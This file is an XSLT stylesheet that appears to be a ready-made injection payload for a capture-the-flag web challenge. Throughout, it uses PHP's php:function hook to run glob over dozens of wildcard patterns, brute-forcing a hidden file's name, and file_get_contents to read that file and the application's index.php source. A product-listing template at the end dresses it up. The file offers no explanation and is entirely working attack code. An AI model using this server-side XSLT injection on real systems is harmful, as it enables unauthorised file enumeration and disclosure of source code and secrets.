<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"              
>	
<xsl:param  name="shandle"     select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826*')"/>
<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826a*')"/>
<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826b*')" />
<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826c*')" />
<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826d*')" />
<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826e*')" />
<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826f*')" />
<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826g*')"/>
<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826h*')" />
<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826i*')" />
<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826j*')"/>
<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826k*')" />
<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826l*')" />
<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826m*')" />
<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826n*')" />
<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826o*')" />
<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826p*')" />
<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826q*')" />
<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826r*')" />
<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826s*')"/>
<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826t*')" />
<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826u*')" />
<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826v*')" />
<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826w*')" />
<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826x*')" />
<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826y*')" />
<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826z*')" />
<xsl:param  name="shandleBa"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826A*')"/>
<xsl:param  name="shandleBb"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826B*')" />
<xsl:param  name="shandleBc"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826C*')" />
<xsl:param  name="shandleBd"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826D*')" />
<xsl:param  name="shandleBe"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826E*')" />
<xsl:param  name="shandleBf"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826F*')" />
<xsl:param  name="shandleBg"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826G*')"/>
<xsl:param  name="shandleBh"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826H*')" />
<xsl:param  name="shandleBi"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826I*')" />
<xsl:param  name="shandleBj"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826J*')"/>
<xsl:param  name="shandleBk"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826K*')" />
<xsl:param  name="shandleBl"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826L*')" />
<xsl:param  name="shandleBm"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826M*')" />
<xsl:param  name="shandleBn"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826N*')" />
<xsl:param  name="shandleBo"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826O*')" />
<xsl:param  name="shandleBp"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826P*')" />
<xsl:param  name="shandleBq"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826Q*')" />
<xsl:param  name="shandleBr"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826R*')" />
<xsl:param  name="shandleBs"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826S*')"/>
<xsl:param  name="shandleBt"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826T*')" />
<xsl:param  name="shandleBu"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826U*')" />
<xsl:param  name="shandleBv"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826V*')" />
<xsl:param  name="shandleBw"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826W*')" />
<xsl:param  name="shandleBx"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826X*')" />
<xsl:param  name="shandleBy"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826Y*')" />
<xsl:param  name="shandleBz"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826Z*')" />
<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826_*')" />
<xsl:param  name="shandle0"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8260*')" />
<xsl:param  name="shandle1"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8261*')" />
<xsl:param  name="shandle2"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8262*')" />
<xsl:param  name="shandle3"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8263*')" />
<xsl:param  name="shandle4"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8264*')" />
<xsl:param  name="shandle5"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8265*')" />
<xsl:param  name="shandle6"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8266*')" />
<xsl:param  name="shandle7"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8267*')" />
<xsl:param  name="shandle8"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8268*')" />
<xsl:param  name="shandle9"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba8269*')" />
<xsl:param  name="shandle10"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826~*')" />
<xsl:param  name="shandle11"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826!*')" />
<xsl:param  name="shandle12"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826@*')" />
<xsl:param  name="shandle13"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826#*')" />
<xsl:param  name="shandle14"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826$*')" />
<xsl:param  name="shandle15"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826%*')" />
<xsl:param  name="shandle16"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826(*')" />
<xsl:param  name="shandle17"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826)*')" />
<xsl:param  name="shandle18"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826-*')" />
<xsl:param  name="shandle19"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826+*')" />
<xsl:param  name="shandle20"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826{*')" />
<xsl:param  name="shandle21"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826}*')" />
<xsl:param  name="shandle22"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826[*')" />
<xsl:param  name="shandle23"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826]*')" />
<xsl:param  name="shandle24"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826|*')" />

<xsl:param  name="shandle27"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826.*')" />
<xsl:param  name="shandle28"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826;*')" />
<xsl:param  name="shandle29"    select="php:function('glob','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826:*')" />
<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826')" /> 
<xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
<xsl:template match="/">	
  ._php*:<xsl:value-of select="$shandle"/>
  SCANDIR0 ._phpa*:<xsl:value-of select="$shandlea"/> 
  SCANDIR0 .b*:<xsl:value-of select="$shandleb"/> 
  SCANDIR0 .c*:<xsl:value-of select="$shandlec"/> 
  SCANDIR0 .d*:<xsl:value-of select="$shandled"/> 
  SCANDIR0 .e*:<xsl:value-of select="$shandlee"/>  
  SCANDIR0 .f*:<xsl:value-of select="$shandlef"/> 
  SCANDIR0 .g*:<xsl:value-of select="$shandleg"/> 
  SCANDIR0 .h*:<xsl:value-of select="$shandleh"/> 
  SCANDIR0 .i*:<xsl:value-of select="$shandlei"/> 
  SCANDIR0 .j*:<xsl:value-of select="$shandlej"/>   
  SCANDIR0 .k*:<xsl:value-of select="$shandlek"/> 
  SCANDIR0 .l*:<xsl:value-of select="$shandlel"/> 
  SCANDIR0 .m*:<xsl:value-of select="$shandlem"/> 
  SCANDIR0 .n*:<xsl:value-of select="$shandlen"/> 
  SCANDIR0 .o*:<xsl:value-of select="$shandleo"/>  
  SCANDIR0 .p*:<xsl:value-of select="$shandlep"/> 
  SCANDIR0 .q*:<xsl:value-of select="$shandleq"/> 
  SCANDIR0 .r*:<xsl:value-of select="$shandler"/> 
  SCANDIR0 .s*:<xsl:value-of select="$shandles"/> 
  SCANDIR0 .t*:<xsl:value-of select="$shandlet"/> 
  SCANDIR0 .u*:<xsl:value-of select="$shandleu"/> 
  SCANDIR0 .v*:<xsl:value-of select="$shandlev"/> 
  SCANDIR0 .w*:<xsl:value-of select="$shandlew"/> 
  SCANDIR0 .x*:<xsl:value-of select="$shandlex"/> 
  SCANDIR0 .y*:<xsl:value-of select="$shandley"/>  
  SCANDIR0 .z*:<xsl:value-of select="$shandlez"/>
  SCANDIR0 ._phpA*:<xsl:value-of select="$shandleBa"/> 
  SCANDIR0 .B*:<xsl:value-of select="$shandleBb"/> 
  SCANDIR0 .C*:<xsl:value-of select="$shandleBc"/> 
  SCANDIR0 .D*:<xsl:value-of select="$shandleBd"/> 
  SCANDIR0 .E*:<xsl:value-of select="$shandleBe"/>  
  SCANDIR0 .f*:<xsl:value-of select="$shandleBf"/> 
  SCANDIR0 .g*:<xsl:value-of select="$shandleBg"/> 
  SCANDIR0 .h*:<xsl:value-of select="$shandleBh"/> 
  SCANDIR0 .i*:<xsl:value-of select="$shandleBi"/> 
  SCANDIR0 .j*:<xsl:value-of select="$shandleBj"/>   
  SCANDIR0 .k*:<xsl:value-of select="$shandleBk"/> 
  SCANDIR0 .l*:<xsl:value-of select="$shandleBl"/> 
  SCANDIR0 .m*:<xsl:value-of select="$shandleBm"/> 
  SCANDIR0 .n*:<xsl:value-of select="$shandleBn"/> 
  SCANDIR0 .o*:<xsl:value-of select="$shandleBo"/>  
  SCANDIR0 .p*:<xsl:value-of select="$shandleBp"/> 
  SCANDIR0 .q*:<xsl:value-of select="$shandleBq"/> 
  SCANDIR0 .r*:<xsl:value-of select="$shandleBr"/> 
  SCANDIR0 .s*:<xsl:value-of select="$shandleBs"/> 
  SCANDIR0 .t*:<xsl:value-of select="$shandleBt"/> 
  SCANDIR0 .u*:<xsl:value-of select="$shandleBu"/> 
  SCANDIR0 .v*:<xsl:value-of select="$shandleBv"/> 
  SCANDIR0 .w*:<xsl:value-of select="$shandleBw"/> 
  SCANDIR0 .x*:<xsl:value-of select="$shandleBx"/> 
  SCANDIR0 .y*:<xsl:value-of select="$shandleBy"/>  
  SCANDIR0 .z*:<xsl:value-of select="$shandleBz"/>
  SCANDIR0 ._*:<xsl:value-of select="$shandle_"/>   
SCANDIR0 ._0*:<xsl:value-of select="$shandle0"/>
SCANDIR0 ._1*:<xsl:value-of select="$shandle1"/>
SCANDIR0 ._2*:<xsl:value-of select="$shandle2"/>
SCANDIR0 ._3*:<xsl:value-of select="$shandle3"/>
SCANDIR0 ._4*:<xsl:value-of select="$shandle4"/>
SCANDIR0 ._5*:<xsl:value-of select="$shandle5"/>
SCANDIR0 ._6*:<xsl:value-of select="$shandle6"/>
SCANDIR0 ._7*:<xsl:value-of select="$shandle7"/>
SCANDIR0 ._8*:<xsl:value-of select="$shandle8"/>
SCANDIR0 ._9*:<xsl:value-of select="$shandle9"/>
SCANDIR0 ._0*:<xsl:value-of select="$shandle10"/>
SCANDIR0 ._1*:<xsl:value-of select="$shandle11"/>
SCANDIR0 ._2*:<xsl:value-of select="$shandle12"/>
SCANDIR0 ._3*:<xsl:value-of select="$shandle13"/>
SCANDIR0 ._4*:<xsl:value-of select="$shandle14"/>
SCANDIR0 ._5*:<xsl:value-of select="$shandle15"/>
SCANDIR0 ._6*:<xsl:value-of select="$shandle16"/>
SCANDIR0 ._7*:<xsl:value-of select="$shandle17"/>
SCANDIR0 ._8*:<xsl:value-of select="$shandle18"/>
SCANDIR0 ._9*:<xsl:value-of select="$shandle19"/>
SCANDIR0 ._0*:<xsl:value-of select="$shandle20"/>
SCANDIR0 ._1*:<xsl:value-of select="$shandle21"/>
SCANDIR0 ._2*:<xsl:value-of select="$shandle22"/>
SCANDIR0 ._3*:<xsl:value-of select="$shandle23"/>
SCANDIR0 ._4*:<xsl:value-of select="$shandle24"/>

SCANDIR0 ._7*:<xsl:value-of select="$shandle27"/>
SCANDIR0 ._8*:<xsl:value-of select="$shandle28"/>
SCANDIR0 ._9*:<xsl:value-of select="$shandle29"/>
 PHPINFO:<xsl:value-of select="$strscand"/>     
 DIR1 index.php:<xsl:value-of select="$header"/>   
<xsl:value-of select="name"/>
 <div style="background-color:teal;color:white;padding:4px">
<span style="font-weight:bold">
-
</span>
<xsl:value-of select="price"/>
</div>
<div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
<p>
<xsl:value-of select="description"/>
<span style="font-style:italic">
(
<xsl:value-of select="prct"/>
%)
</span>
</p>
</div>
</xsl:template>
</xsl:stylesheet>
